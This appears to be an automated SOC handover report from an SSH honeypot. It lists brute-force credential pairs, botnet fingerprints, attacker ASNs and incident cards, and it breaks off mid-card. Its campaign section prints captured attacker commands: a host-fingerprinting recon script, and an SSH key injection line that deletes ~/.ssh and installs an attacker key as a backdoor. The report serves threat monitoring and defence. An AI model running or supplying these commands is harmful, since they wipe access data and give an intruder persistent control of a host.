# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-15 |
| **Generated At** | 2026-07-15T06:20:04Z |
| **Shift Time** | 06:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **650** |
| Confirmed Threats | **601** |
| False Positives Filtered | **49** (7.5%) |
| Unique Attacker IPs | **141** |
| Countries of Origin | **32** |
| High Severity Cases | **139** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **511** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **185** |
| Unique Credential Pairs | **78** |
| Unique Usernames | **36** |
| Unique Passwords | **70** |
| Successful Auth Pairs | **152** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 54 |
| `admin` | 38 |
| `support` | 13 |
| `user` | 8 |
| `tcpdump` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 12 |
| `support` | 8 |
| `12345` | 8 |
| `admin2020` | 6 |
| `123456` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 11 |
| `support` | `support` | 8 |
| `admin` | `admin2020` | 6 |
| `admin` | `password321` | 5 |
| `tcpdump` | `tcpdump` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `test` | `qwerty123` | `45.156.87.13` | 2026-07-15T00:55:04 |
| `ubuntu` | `Ubuntu123!` | `45.156.87.13` | 2026-07-15T00:55:10 |
| `gd` | `gd` | `45.156.87.13` | 2026-07-15T00:55:17 |
| `master` | `123` | `45.156.87.13` | 2026-07-15T00:55:24 |
| `root` | `12345qwe` | `45.156.87.13` | 2026-07-15T00:55:31 |
| `user2` | `123456` | `45.156.87.13` | 2026-07-15T00:55:38 |
| `hadoop` | `123` | `45.156.87.13` | 2026-07-15T00:55:45 |
| `root` | `abcd1234` | `45.156.87.13` | 2026-07-15T00:55:52 |
| `runner` | `runner` | `45.156.87.13` | 2026-07-15T00:55:59 |
| `root` | `redhat` | `45.156.87.13` | 2026-07-15T00:56:05 |
| `dmdba` | `dmdba` | `45.156.87.13` | 2026-07-15T00:56:12 |
| `support` | `support` | `176.53.159.196` | 2026-07-15T00:56:47 |
| `admin` | `t1l2cm3r` | `149.255.1.35` | 2026-07-15T00:57:18 |
| `admin` | `password321` | `34.146.217.105` | 2026-07-15T00:57:20 |
| `admin` | `password321` | `58.17.128.7` | 2026-07-15T00:57:33 |
| `support` | `support` | `10.0.0.73` | 2026-07-15T00:58:05 |
| `admin` | `password321` | `188.168.86.6` | 2026-07-15T01:00:37 |
| `admin` | `t1l2cm3r` | `27.123.113.10` | 2026-07-15T01:00:46 |
| `admin` | `t1l2cm3r` | `1.247.245.61` | 2026-07-15T01:00:55 |
| `admin` | `password321` | `10.0.0.73` | 2026-07-15T01:00:58 |
| `admin` | `t1l2cm3r` | `10.0.0.73` | 2026-07-15T01:01:00 |
| `root` | `alpine` | `122.187.227.152` | 2026-07-15T01:02:54 |
| `root` | `alpine` | `10.0.0.73` | 2026-07-15T01:03:16 |
| `root` | `Passwd@123` | `10.0.0.73` | 2026-07-15T01:05:45 |
| `root` | `Passwd@123` | `185.242.3.195` | 2026-07-15T01:08:56 |
| `debian` | `P@ssword` | `200.232.114.71` | 2026-07-15T01:22:44 |
| `debian` | `P@ssword` | `103.147.248.23` | 2026-07-15T01:22:54 |
| `root` | `R00t` | `103.68.22.115` | 2026-07-15T01:25:02 |
| `config` | `passw0rd` | `121.202.138.181` | 2026-07-15T01:26:09 |
| `config` | `passw0rd` | `10.0.0.73` | 2026-07-15T01:26:24 |
| `debian` | `P@ssword` | `24.229.22.106` | 2026-07-15T01:26:36 |
| `debian` | `P@ssword` | `10.0.0.73` | 2026-07-15T01:26:53 |
| `root` | `R00t` | `183.167.217.86` | 2026-07-15T01:28:26 |
| `root` | `R00t` | `112.168.38.78` | 2026-07-15T01:28:35 |
| `root` | `Qaz2wsx` | `185.242.3.195` | 2026-07-15T01:45:12 |
| `admin` | `admin2020` | `185.255.212.178` | 2026-07-15T01:48:41 |
| `admin` | `admin2020` | `183.233.85.194` | 2026-07-15T01:48:49 |
| `admin` | `p@ssword` | `14.29.204.161` | 2026-07-15T01:48:53 |
| `admin` | `p@ssword` | `92.84.21.186` | 2026-07-15T01:48:59 |
| `tcpdump` | `tcpdump` | `111.70.32.51` | 2026-07-15T01:51:02 |
| `tcpdump` | `tcpdump` | `171.8.42.112` | 2026-07-15T01:51:12 |
| `admin` | `admin2020` | `222.174.184.86` | 2026-07-15T01:52:13 |
| `admin` | `admin2020` | `103.68.22.115` | 2026-07-15T01:52:26 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-15T01:52:27 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-15T01:52:27 |
| `admin` | `p@ssword` | `10.0.0.73` | 2026-07-15T01:52:38 |
| `admin` | `admin2020` | `10.0.0.73` | 2026-07-15T01:52:41 |
| `tcpdump` | `tcpdump` | `61.37.150.6` | 2026-07-15T01:54:32 |
| `tcpdump` | `tcpdump` | `10.0.0.73` | 2026-07-15T01:54:55 |
| `root` | `Qaz2wsx` | `10.0.0.73` | 2026-07-15T01:59:04 |
| `media` | `media` | `14.153.244.142` | 2026-07-15T02:13:52 |
| `root` | `0` | `24.97.253.246` | 2026-07-15T02:13:54 |
| `root` | `0` | `222.236.155.146` | 2026-07-15T02:17:12 |
| `media` | `media` | `92.62.74.41` | 2026-07-15T02:17:22 |
| `root` | `0` | `36.137.38.119` | 2026-07-15T02:17:28 |
| `operator` | `operator1` | `69.126.144.30` | 2026-07-15T02:19:46 |
| `operator` | `operator1` | `10.0.0.73` | 2026-07-15T02:20:18 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-15T02:27:08 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-15T02:27:10 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-15T02:27:15 |
| `angel` | `123456` | `14.103.117.91` | 2026-07-15T02:30:05 |
| `345gs5662d34` | `345gs5662d34` | `14.103.117.91` | 2026-07-15T02:30:12 |
| `angel` | `3245gs5662d34` | `14.103.117.91` | 2026-07-15T02:30:15 |
| `admin` | `admin` | `107.189.10.124` | 2026-07-15T02:30:17 |
| `root` | `PMGS**56$wx*%*St` | `185.242.3.195` | 2026-07-15T02:38:05 |
| `admin` | `admin` | `223.85.251.55` | 2026-07-15T02:40:27 |
| `support` | `123321` | `189.56.0.19` | 2026-07-15T02:40:41 |
| `supervisor` | `6` | `116.72.9.151` | 2026-07-15T02:43:16 |
| `supervisor` | `6` | `113.158.205.225` | 2026-07-15T02:43:25 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-15T02:44:17 |
| `user` | `webmaster` | `211.247.127.250` | 2026-07-15T02:44:19 |
| `support` | `123321` | `219.128.15.190` | 2026-07-15T02:44:20 |
| `user` | `webmaster` | `122.224.164.194` | 2026-07-15T02:44:28 |
| `user` | `webmaster` | `10.0.0.73` | 2026-07-15T02:44:38 |
| `support` | `123321` | `175.198.18.3` | 2026-07-15T02:44:39 |
| `supervisor` | `6` | `121.189.226.81` | 2026-07-15T02:46:44 |
| `supervisor` | `6` | `10.0.0.73` | 2026-07-15T02:46:56 |
| `root` | `PMGS**56$wx*%*St` | `10.0.0.73` | 2026-07-15T02:51:54 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-15T03:06:34 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-15T03:06:34 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-15T03:06:42 |
| `root` | `admin` | `94.154.43.230` | 2026-07-15T03:08:05 |
| `nexthink` | `123456` | `27.128.162.146` | 2026-07-15T03:09:18 |
| `root` | `libreelec` | `154.146.238.122` | 2026-07-15T03:09:27 |
| `nexthink` | `123456` | `210.177.143.61` | 2026-07-15T03:09:28 |
| `root` | `libreelec` | `201.163.73.88` | 2026-07-15T03:09:34 |
| `test` | `1qaz@WSX` | `10.0.0.73` | 2026-07-15T03:12:05 |
| `root` | `return` | `220.250.52.101` | 2026-07-15T03:27:46 |
| `345gs5662d34` | `345gs5662d34` | `220.250.52.101` | 2026-07-15T03:27:50 |
| `root` | `3245gs5662d34` | `220.250.52.101` | 2026-07-15T03:27:52 |
| `michael` | `12345` | `185.242.3.195` | 2026-07-15T03:30:40 |
| `root` | `aaaqqq` | `41.216.178.119` | 2026-07-15T03:30:44 |
| `345gs5662d34` | `345gs5662d34` | `41.216.178.119` | 2026-07-15T03:30:48 |
| `root` | `3245gs5662d34` | `41.216.178.119` | 2026-07-15T03:30:50 |
| `dhis` | `dhis` | `101.13.4.128` | 2026-07-15T03:31:47 |
| `dhis` | `dhis` | `103.121.27.218` | 2026-07-15T03:32:02 |
| `dhis` | `dhis` | `10.0.0.73` | 2026-07-15T03:36:00 |
| `manager` | `friend` | `186.103.136.43` | 2026-07-15T03:36:01 |
| `manager` | `friend` | `180.188.253.150` | 2026-07-15T03:36:11 |
| `admin` | `gzHKde9TDRW4g` | `196.189.126.185` | 2026-07-15T03:38:23 |
| `michael` | `12345` | `10.0.0.73` | 2026-07-15T03:44:35 |
| `testuser` | `Password@123` | `218.106.33.54` | 2026-07-15T03:45:58 |
| `345gs5662d34` | `345gs5662d34` | `218.106.33.54` | 2026-07-15T03:46:02 |
| `testuser` | `3245gs5662d34` | `218.106.33.54` | 2026-07-15T03:46:04 |
| `admin` | `admin` | `46.29.26.195` | 2026-07-15T03:56:47 |
| `blank` | `qwerty1` | `81.22.51.64` | 2026-07-15T03:57:43 |
| `blank` | `qwerty1` | `45.178.227.0` | 2026-07-15T03:57:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.79.128.63` | 2026-07-15T03:57:53 |
| `centos` | `123123123` | `64.53.7.231` | 2026-07-15T03:57:57 |
| `*1` | `$4` | `34.79.128.63` | 2026-07-15T03:58:01 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 603` | `34.79.128.63` | 2026-07-15T03:58:03 |
| `admin` | `qwerty12` | `178.178.222.60` | 2026-07-15T04:00:09 |
| `admin` | `qwerty12` | `49.124.152.215` | 2026-07-15T04:00:25 |
| `blank` | `qwerty1` | `60.167.19.189` | 2026-07-15T04:01:19 |
| `centos` | `123123123` | `49.124.151.21` | 2026-07-15T04:01:21 |
| `centos` | `123123123` | `222.75.225.206` | 2026-07-15T04:01:32 |
| `centos` | `123123123` | `10.0.0.73` | 2026-07-15T04:01:40 |
| `admin` | `qwerty12` | `10.0.0.73` | 2026-07-15T04:04:04 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-15T04:06:02 |
| `lyl` | `123456` | `2.58.172.185` | 2026-07-15T04:13:36 |
| `admin` | `admin` | `34.78.56.95` | 2026-07-15T04:19:34 |
| `root` | `rootroot` | `185.242.3.195` | 2026-07-15T04:23:26 |
| `user` | `12345` | `220.246.41.171` | 2026-07-15T04:23:29 |
| `test` | `passwd` | `78.189.17.35` | 2026-07-15T04:26:14 |
| `admin` | `admin2001` | `35.130.111.98` | 2026-07-15T04:27:10 |
| `admin` | `admin2001` | `200.105.141.172` | 2026-07-15T04:27:19 |
| `user` | `12345` | `117.248.201.39` | 2026-07-15T04:27:26 |
| `admin` | `admin2001` | `10.0.0.73` | 2026-07-15T04:27:34 |
| `user` | `12345` | `186.239.41.74` | 2026-07-15T04:27:38 |
| `user` | `12345` | `10.0.0.73` | 2026-07-15T04:27:50 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `104.199.52.37` | 2026-07-15T04:29:25 |
| `*1` | `$4` | `104.199.52.37` | 2026-07-15T04:29:39 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2275` | `104.199.52.37` | 2026-07-15T04:29:40 |
| `"??$` | `:%1>$538` | `169.211.128.234` | 2026-07-15T04:35:28 |
| `"??$` | `#?<?;5)` | `169.211.128.234` | 2026-07-15T04:36:02 |
| `mg3500` | `merlin` | `169.211.128.234` | 2026-07-15T04:36:36 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xe4\xca\xdb\x8b\x8c\x8f'` | `169.211.128.234` | 2026-07-15T04:37:10 |
| `lghkel	` | `zpz}ld	` | `169.211.128.234` | 2026-07-15T04:37:11 |
| `root` | `rootroot` | `10.0.0.73` | 2026-07-15T04:37:25 |
| `root` | `ivdev` | `169.211.128.234` | 2026-07-15T04:37:44 |
| `root` | `xc3511` | `169.211.128.234` | 2026-07-15T04:38:18 |
| `root` | `7ujMko0vizxv` | `169.211.128.234` | 2026-07-15T04:39:26 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\xef\xc9\xdb\xcd\xca\xf3\x8e\xda\xdb\xd3'` | `169.211.128.234` | 2026-07-15T04:40:34 |
| `root` | `J8U2yhcJlB` | `10.0.0.73` | 2026-07-15T04:43:54 |
| `root` | `!root` | `2.57.122.209` | 2026-07-15T04:49:03 |
| `root` | `111111` | `2.57.122.209` | 2026-07-15T04:51:50 |
| `root` | `2020` | `123.129.245.249` | 2026-07-15T04:52:46 |
| `root` | `2020` | `41.231.85.75` | 2026-07-15T04:52:55 |
| `root` | `1q2w3e4r5t6y` | `124.152.90.68` | 2026-07-15T04:53:40 |
| `support` | `support123` | `10.0.0.73` | 2026-07-15T04:53:44 |
| `root` | `1q2w3e4r5t6y` | `10.0.0.73` | 2026-07-15T04:54:08 |
| `root` | `123123` | `2.57.122.209` | 2026-07-15T04:54:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **650** |
| Sessions with Fingerprint | **22** |
| Unique HASSH Fingerprints | **22** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 72 |
| Go SSH scanner | 40 |
| libssh | 25 |
| Paramiko (Python) | 12 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 64 | 62 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `0a07365cc01f...` | Generic scanner | 11 | 1 |
| `16443846184e...` | Generic scanner | 11 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 64 | 62 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 11 | 1 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 11 | 3 | Generic scanner |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 3 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `218.106.33.54`, `41.216.178.119`, `220.250.52.101`, `14.103.117.91`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **141** |
| Unique ASNs | **78** |
| High-Risk ASNs | **73** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 14 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (139)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-282994dbeb9c

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:03` | `cowrie.session.connect` |
| `2026-07-15 00:55:03` | `cowrie.client.version` |
| `2026-07-15 00:55:03` | `cowrie.client.kex` |
| `2026-07-15 00:55:04` | `cowrie.login.success` |
| `2026-07-15 00:55:05` | `cowrie.session.params` |
| `2026-07-15 00:55:05` | `cowrie.command.input` |
| `2026-07-15 00:55:05` | `cowrie.log.closed` |
| `2026-07-15 00:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0699684d2186

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:10` | `cowrie.session.connect` |
| `2026-07-15 00:55:10` | `cowrie.client.version` |
| `2026-07-15 00:55:10` | `cowrie.client.kex` |
| `2026-07-15 00:55:10` | `cowrie.login.success` |
| `2026-07-15 00:55:11` | `cowrie.session.params` |
| `2026-07-15 00:55:11` | `cowrie.command.input` |
| `2026-07-15 00:55:11` | `cowrie.log.closed` |
| `2026-07-15 00:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e293c97c81bc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:17` | `cowrie.session.connect` |
| `2026-07-15 00:55:17` | `cowrie.client.version` |
| `2026-07-15 00:55:17` | `cowrie.client.kex` |
| `2026-07-15 00:55:17` | `cowrie.login.success` |
| `2026-07-15 00:55:18` | `cowrie.session.params` |
| `2026-07-15 00:55:18` | `cowrie.command.input` |
| `2026-07-15 00:55:18` | `cowrie.log.closed` |
| `2026-07-15 00:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dbecf10bc29

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:24` | `cowrie.session.connect` |
| `2026-07-15 00:55:24` | `cowrie.client.version` |
| `2026-07-15 00:55:24` | `cowrie.client.kex` |
| `2026-07-15 00:55:24` | `cowrie.login.success` |
| `2026-07-15 00:55:25` | `cowrie.session.params` |
| `2026-07-15 00:55:25` | `cowrie.command.input` |
| `2026-07-15 00:55:25` | `cowrie.log.closed` |
| `2026-07-15 00:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa43e657cc00

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:31` | `cowrie.session.connect` |
| `2026-07-15 00:55:31` | `cowrie.client.version` |
| `2026-07-15 00:55:31` | `cowrie.client.kex` |
| `2026-07-15 00:55:31` | `cowrie.login.success` |
| `2026-07-15 00:55:32` | `cowrie.session.params` |
| `2026-07-15 00:55:32` | `cowrie.command.input` |
| `2026-07-15 00:55:32` | `cowrie.log.closed` |
| `2026-07-15 00:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e1315719f0

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:38` | `cowrie.session.connect` |
| `2026-07-15 00:55:38` | `cowrie.client.version` |
| `2026-07-15 00:55:38` | `cowrie.client.kex` |
| `2026-07-15 00:55:38` | `cowrie.login.success` |
| `2026-07-15 00:55:39` | `cowrie.session.params` |
| `2026-07-15 00:55:39` | `cowrie.command.input` |
| `2026-07-15 00:55:39` | `cowrie.log.closed` |
| `2026-07-15 00:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5646a8a3bb63

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:45` | `cowrie.session.connect` |
| `2026-07-15 00:55:45` | `cowrie.client.version` |
| `2026-07-15 00:55:45` | `cowrie.client.kex` |
| `2026-07-15 00:55:45` | `cowrie.login.success` |
| `2026-07-15 00:55:46` | `cowrie.session.params` |
| `2026-07-15 00:55:46` | `cowrie.command.input` |
| `2026-07-15 00:55:46` | `cowrie.log.closed` |
| `2026-07-15 00:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac30a8c0bb22

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:51` | `cowrie.session.connect` |
| `2026-07-15 00:55:51` | `cowrie.client.version` |
| `2026-07-15 00:55:51` | `cowrie.client.kex` |
| `2026-07-15 00:55:52` | `cowrie.login.success` |
| `2026-07-15 00:55:53` | `cowrie.session.params` |
| `2026-07-15 00:55:53` | `cowrie.command.input` |
| `2026-07-15 00:55:53` | `cowrie.log.closed` |
| `2026-07-15 00:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0c876a66488

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:55 |
| **Last Seen** | 2026-07-15 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:55:58` | `cowrie.session.connect` |
| `2026-07-15 00:55:58` | `cowrie.client.version` |
| `2026-07-15 00:55:58` | `cowrie.client.kex` |
| `2026-07-15 00:55:59` | `cowrie.login.success` |
| `2026-07-15 00:56:00` | `cowrie.session.params` |
| `2026-07-15 00:56:00` | `cowrie.command.input` |
| `2026-07-15 00:56:00` | `cowrie.log.closed` |
| `2026-07-15 00:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c7ac076fb5

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:56 |
| **Last Seen** | 2026-07-15 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:56:05` | `cowrie.session.connect` |
| `2026-07-15 00:56:05` | `cowrie.client.version` |
